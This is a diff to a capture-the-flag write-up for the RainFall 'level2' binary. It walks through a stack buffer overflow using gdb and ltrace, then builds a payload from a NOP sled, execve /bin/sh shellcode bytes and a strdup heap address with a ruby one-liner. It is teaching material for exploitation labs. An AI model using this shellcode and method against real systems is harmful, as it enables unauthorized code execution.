@@ -3,18 +3,6 @@ We will use buffer overflow to create asm binary code that will execute a shell 
 The binary code found to launch a shell is "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 We will add some NOP ('\x90') operators to fill the buffer.
 
-To find it we will use gdb :
-    $ gdb -q ./level2
-    (gdb) run
-    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-    info registers
-
-There is a verification that our return address isn't overwritten.
-    (gdb) disas p
-    ...
-    0x080484fb <+39>:    and    $0xb0000000,%eax
-    0x08048500 <+44>:    cmp    $0xb0000000,%eax
-    ...
 
 The function 'p' will use strdup at the very end
     (gdb) disas p
@@ -28,7 +16,33 @@ level2@RainFall:~$ ltrace ./level2
     strdup("")                                    = 0x0804a008
     ...
 
-By setting a breakpoint before and after the strdup call we can use info registers to see eax changing to this address.
+Now we know where our shellcode will be stored
+
+We can find where our return address is stored with
+	(gdb) b*0x080484d4
+	Breakpoint 1 at 0x80484d4
+	(gdb) r
+	(gdb) x/4x $ebp-12
+	0xbffff6fc:	0x0804854a	0x08048550	0x00000000	0x00000000
+
+
+return address is stored at 0xbffff6fc
+
+We set a breakpoint just after gets() and we can see that the return address will be replace by string[80:84]
+	(gdb) b*0x080484f2
+	Breakpoint 1 at 0x80484f2
+	(gdb) r
+	Starting program: /home/user/level2/level2
+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAA
+
+	Breakpoint 1, 0x080484f2 in p ()
+	(gdb) x/x $ebp+4
+	0xbffff6fc:	0x41414141
+
+So we will need to give a string that will look like
+[NOP*35]+[shellcode (len=45)]+[strdup_address]
+
+That way, we will overwrite our return address with the strdup writing address and our buffer will contain the shellcode to be executed
 
 Then we create a file using the previous informations :
     $ ruby -e 'print "\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08"' > /tmp/buffer_overload
